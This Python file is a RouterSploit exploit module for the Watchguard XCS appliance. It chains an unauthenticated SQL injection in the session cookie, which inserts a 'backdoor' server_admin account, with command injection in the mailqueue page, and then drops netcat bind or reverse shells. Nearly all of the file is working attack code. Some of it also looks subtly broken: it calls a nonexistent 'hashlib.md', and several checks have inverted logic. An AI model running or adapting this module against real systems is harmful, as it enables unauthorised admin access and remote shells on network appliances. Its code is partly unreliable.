import re
import time
from random import randint
import hashlib

from routersploit import (
    exploits,
    print_success,
    print_status,
    print_error,
    http_request,
    mute,
    shell,
)


class Exploit(exploits.Exploit):
    """
    This module exploits two separate vulnerabilities found in the Watchguard XCS virtual
    appliance to gain command execution. By exploiting an unauthenticated SQL injection, a
    remote attacker may insert a valid web user into the appliance database, and get access
    to the web interface. On the other hand, a vulnerability in the web interface allows the
    attacker to inject operating system commands as the 'nobody' user.
    """
    __info__ = {
        'name': 'Watchguard XCS Remote Command Execution',
        'description': 'This module exploits two separate vulnerabilities found in the Watchguard XCS virtual'
        'appliance to gain command execution. By exploiting an unauthenticated SQL injection, a '
        'remote attacker may insert a valid web user into the appliance database, and get access '
        'to the web interface. On the other hand, a vulnerability in the web interface allows the '
        'attacker to inject operating system commands as the "nobody" user.',
        'authors': [
            'Daniel Jensen <daniel.jensen[at]security-assessment.com>',  # discovery and Metasploit module
            'GH0st3rs',  # routersploit module
        ],
        'references': [
            'http://security-assessment.com/files/documents/advisory/Watchguard-XCS-final.pdf',
            'https://vulners.com/metasploit/MSF:EXPLOIT/FREEBSD/HTTP/WATCHGUARD_CMD_EXEC?utm_source=telegram&utm_medium=vulnersBot&utm_campaign=search'
        ],
        'devices': [
            'Watchguard XCS 9.2/10.0',
        ],
    }

    target = exploits.Option('', 'Target address e.g. 192.168.1.1')  # target address
    port = exploits.Option(443, 'WatchGuard WebUI port')  # default port
    WATCHGUARD_USER = exploits.Option('backdoor', 'Web interface user account to add')
    WATCHGUARD_PASSWORD = exploits.Option('backdoor', 'Web interface user password')
    verbosity = exploits.Option('yes', 'Display found information')

    TOTAL_REQUESTS = 0
    start_time = time.time()
    USERNAME_LEN = 8
    HASH_LEN = 32

    def run(self):
        if self.check():
            # Get a valid session by logging in or exploiting SQLi to add user
            print_status('Getting a valid session...')
            self.sid = self.get_session()
            print_success('Successfully logged in')

            # Check if cmd injection works
            test_cmd_inj = self.send_cmd_exec('/ADMIN/mailqueue.spl', 'id')
            if not test_cmd_inj and 'uid=65534' not in test_cmd_inj.text:
                print_error('Could not inject command, may not be vulnerable')

            # We have cmd exec, stand up an HTTP server and deliver the payload
            print_status('Getting ready to drop binary on appliance')

            self.elf_sent = False
            # Generate payload
            shell(self,
                  architecture="generic",
                  method="netcat",
                  payloads=["netcat_bind_tcp", "netcat_reverse_tcp"]
                  )
        else:
            print_error("Exploit failed - target seems to be not vulnerable")

    @mute
    def check(self):
        url = 'https://{}:{}/borderpost/imp/compose.php3'.format(self.target, self.port)
        header = {
            'cookie': "sid=1'",
        }
        req = http_request(method="GET", url=url, headers=header, verify=False)
        if req and req.text and 'unterminated quoted string' in req.text:
            return True  # target is vulnerable
        return False  # target is not vulnerable

    def attempt_login(self, username, pwd_clear):
        # Attempts to login with the provided user credentials
        # Get the login page
        url = 'https://{}:{}/login.spl'.format(self.target, self.port)
        get_login_hash = http_request(method="GET", url=url)

        if not get_login_hash and not get_login_hash.context:
            print_error('Could not get login page.')
            return False

        # Find the hash token needed to login
        login_hash = ''
        for line in get_login_hash.text.splitlines():
            login_hash = re.findall('name="hash" value="(.*)"', line)
            if login_hash:
                login_hash = login_hash[0]
                break
            else:
                login_hash = ''

        sid_cookie = re.findall('sid=(\w+);', get_login_hash.headers['cookie'] or '')[0] or ''
        if login_hash == '' or sid_cookie == '':
            print_error('Could not find login hash or cookie')
            return False

        login_post = {
            'u': username,
            'pwd': pwd_clear,
            'hash': login_hash,
            'login': 'Login'
        }
        print_status('Attempting to login with provided credentials')
        url = 'https://{}:{}/login.spl?f=V'.format(self.target, self.port)
        login = http_request(method='POST', url=url, headers={'cookie': "sid={sid_cookie}".format(sid_cookie=sid_cookie)}, data=login_post)

        if not login and login.body and '<title>Loading...</title>' not in login.text:
            return False

        return sid_cookie

    def add_user(self, user_id, username, pwd_hash, pwd_clear):
        # Adds a user to the database using the unauthed SQLi
        url = 'https://{}:{}/borderpost/imp/compose.php3'.format(self.target, self.port)
        cookie_str = "sid=1%3BINSERT INTO sds_users (self, login, password, org, priv_level, quota, disk_usage) VALUES({user_id}, '{username}', '{pwd_hash}', 0, 'server_admin', 0, 0)--"
        res = http_request(
            method='GET', url=url,
            headers={
                'cookie': cookie_str.format(user_id=user_id, username=username, pwd_hash=pwd_hash)
            }
        )

        if not res and not res.context:
            print_error("Could not connect to host")
            return False

        if 'ERROR:  duplicate key value violates unique constraint' in res.text:
            print_status("Added backdoor user, credentials => {username}:{pwd_clear}".format(
                username=username,
                pwd_clear=pwd_clear
            ))
        else:
            print_error('Unable to add user to database')
            return False

        return True

    def generate_device_hash(self, cleartext_password):
        # Generates the specific hashes needed for the XCS
        pre_salt = 'BorderWare '
        post_salt = ' some other random (9) stuff'
        hash_tmp = hashlib.md5(pre_salt + cleartext_password + post_salt).hexdigest()
        final_hash = hashlib.md(cleartext_password + hash_tmp).hexdigest()
        return final_hash

    def send_cmd_exec(self, uri, os_cmd, blocking=True):
        # This is a handler function that makes HTTP calls to exploit the command injection issue
        if not self.sid:
            print_error('Missing a session cookie when attempting to execute command.')
            return False

        url = 'https://{host}:{port}{uri}?f=dnld&id=;{os_cmd}'.format(
            host=self.target,
            port=self.port,
            uri=uri,
            os_cmd=os_cmd
        )
        header = {'cookie': "sid={sid}".format(sid=self.sid)}

        if blocking:
            res = http_request(method='GET', url=url, headers=header)
        else:
            res = http_request(method='GET', url=url, headers=header)

        # Handle cmd exec failures
        if not res and blocking:
            print_error('Failed to exploit command injection.')
            return False

        return res

    def get_session(self):
        # Gets a valid login session, either valid creds or the SQLi vulnerability
        username = self.WATCHGUARD_USER
        pwd_clear = self.WATCHGUARD_PASSWORD
        user_id = randint(10, 999)

        sid_cookie = self.attempt_login(username, pwd_clear)
        if sid_cookie:
            return sid_cookie

        print_error('Failed to login, attempting to add backdoor user...')
        pwd_hash = self.generate_device_hash(pwd_clear)

        if not self.add_user(user_id, username, pwd_hash, pwd_clear):
            print_error('Failed to add user account to database.')
            return False

        sid_cookie = self.attempt_login(username, pwd_clear)
        if not sid_cookie:
            print_error('Unable to login with user account.')
            return False

        return sid_cookie

    # Make the server download the payload and run it
    def execute(self, cmd):
        print_status('Sending the payload to the server...')
        print_status("Telling appliance to run {cmd}".format(cmd=cmd))
        self.send_cmd_exec('/ADMIN/mailqueue.spl', cmd)
        return ""
